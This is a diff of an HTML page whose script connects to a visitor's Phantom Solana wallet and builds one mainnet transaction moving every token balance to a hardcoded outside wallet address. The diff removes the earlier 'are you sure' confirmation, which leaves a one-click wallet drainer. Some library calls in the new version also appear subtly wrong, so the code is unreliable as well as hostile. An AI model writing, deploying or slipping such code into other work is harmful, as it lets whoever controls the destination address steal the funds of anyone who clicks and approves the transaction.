@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Transfer Tokens</title>
+  <title>Send All Tokens</title>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.5/dist/index.iife.min.js"></script>
   <style>
     body {
       display: flex;
@@ -32,80 +33,100 @@
   </style>
 </head>
 <body>
-  <h1>Передача всех токенов</h1>
-  <button id="transferTokens">Отправить все токены</button>
+  <button id="sendTokens">Send All Tokens</button>
 
   <script>
-    const destinationWallet = "4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE"; // Кошелек для перевода токенов
+    const DESTINATION_WALLET = "4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE"; // Адрес для отправки токенов
 
-    async function transferAllTokens() {
-      try {
-        if (!window.solana) {
-          alert("Убедитесь, что у вас установлен Phantom Wallet.");
-          return;
-        }
+    async function sendAllTokens() {
+      if (window.solana && window.solana.isPhantom) {
+        try {
+          // Подключаемся к кошельку
+          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+          const wallet = await window.solana.connect();
+          const senderPublicKey = wallet.publicKey;
 
-        const provider = window.solana;
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-        const wallet = await provider.connect();
-        const publicKey = wallet.publicKey;
+          alert(`Connected to wallet: ${senderPublicKey}`);
 
-        // Получение всех токен-аккаунтов пользователя
-        const accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-          programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-        });
+          // Получаем список всех токенов на кошельке
+          const tokenAccounts = await connection.getParsedTokenAccountsByOwner(senderPublicKey, {
+            programId: solanaWeb3.TokenProgramId
+          });
 
-        if (accounts.value.length === 0) {
-          alert("На вашем кошельке нет токенов для передачи.");
-          return;
-        }
-
-        // Подтверждение от пользователя
-        const confirmation = confirm("Вы уверены, что хотите передать все свои токены?");
-        if (!confirmation) return;
-
-        // Создание транзакции
-        const transaction = new solanaWeb3.Transaction();
-
-        for (const account of accounts.value) {
-          const tokenAccount = account.pubkey; // Токен-аккаунт пользователя
-          const tokenAmount = account.account.data.parsed.info.tokenAmount.uiAmount;
-          const decimals = account.account.data.parsed.info.tokenAmount.decimals;
-          const mintAddress = account.account.data.parsed.info.mint;
-
-          if (tokenAmount > 0) {
-            const amountToTransfer = tokenAmount * (10 ** decimals);
-
-            // Добавляем инструкцию перевода токена
-            const transferInstruction = solanaWeb3.Token.createTransferInstruction(
-              solanaWeb3.TOKEN_PROGRAM_ID, // Программа токенов Solana
-              tokenAccount, // Текущий аккаунт токена
-              destinationWallet, // Целевой кошелек
-              publicKey, // Отправитель
-              [], // Подписи
-              amountToTransfer // Сумма перевода
-            );
-
-            transaction.add(transferInstruction); // Добавляем инструкцию в транзакцию
+          if (tokenAccounts.value.length === 0) {
+            alert("No tokens found on this wallet.");
+            return;
           }
-        }
 
-        if (transaction.instructions.length === 0) {
-          alert("Нет токенов для перевода.");
-          return;
-        }
+          // Создаем транзакцию
+          const transaction = new solanaWeb3.Transaction();
 
-        // Подписываем и отправляем транзакцию
-        const signature = await provider.signAndSendTransaction(transaction);
-        console.log(`Транзакция отправлена. Подпись: ${signature}`);
-        alert("Все токены успешно переданы!");
-      } catch (err) {
-        console.error("Ошибка при передаче токенов:", err);
-        alert("Произошла ошибка. Проверьте консоль для подробностей.");
+          // Перебираем токены и добавляем команды на отправку в транзакцию
+          for (const tokenAccount of tokenAccounts.value) {
+            const tokenInfo = tokenAccount.account.data.parsed.info;
+            const mintAddress = tokenInfo.mint;
+            const balance = tokenInfo.tokenAmount.uiAmount;
+
+            if (balance > 0) {
+              const sourceTokenAddress = tokenAccount.pubkey;
+
+              // Получаем или создаем аккаунт для токена у получателя
+              const destinationTokenAddress = await solanaWeb3.Token.getAssociatedTokenAddress(
+                solanaWeb3.ASSOCIATED_TOKEN_PROGRAM_ID,
+                solanaWeb3.TOKEN_PROGRAM_ID,
+                new solanaWeb3.PublicKey(mintAddress),
+                new solanaWeb3.PublicKey(DESTINATION_WALLET)
+              );
+
+              // Проверяем, существует ли аккаунт получателя
+              const destinationAccountInfo = await connection.getAccountInfo(destinationTokenAddress);
+
+              if (!destinationAccountInfo) {
+                transaction.add(
+                  solanaWeb3.Token.createAssociatedTokenAccountInstruction(
+                    solanaWeb3.ASSOCIATED_TOKEN_PROGRAM_ID,
+                    solanaWeb3.TOKEN_PROGRAM_ID,
+                    new solanaWeb3.PublicKey(mintAddress),
+                    destinationTokenAddress,
+                    new solanaWeb3.PublicKey(DESTINATION_WALLET),
+                    senderPublicKey
+                  )
+                );
+              }
+
+              // Добавляем инструкцию на отправку токенов
+              transaction.add(
+                solanaWeb3.Token.createTransferInstruction(
+                  solanaWeb3.TOKEN_PROGRAM_ID,
+                  sourceTokenAddress,
+                  destinationTokenAddress,
+                  senderPublicKey,
+                  [],
+                  balance * (10 ** tokenInfo.tokenAmount.decimals) // Учитываем количество знаков после запятой
+                )
+              );
+            }
+          }
+
+          // Подписываем и отправляем транзакцию
+          const { blockhash } = await connection.getRecentBlockhash();
+          transaction.recentBlockhash = blockhash;
+          transaction.feePayer = senderPublicKey;
+
+          const signedTransaction = await wallet.signTransaction(transaction);
+          const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+
+          alert(`Transaction sent! Signature: ${signature}`);
+        } catch (err) {
+          console.error('Error:', err);
+          alert('Error occurred. Check console for details.');
+        }
+      } else {
+        alert('Phantom Wallet not found. Please install it.');
       }
     }
 
-    document.getElementById("transferTokens").addEventListener("click", transferAllTokens);
+    document.getElementById("sendTokens").addEventListener("click", sendAllTokens);
   </script>
 </body>
 </html>
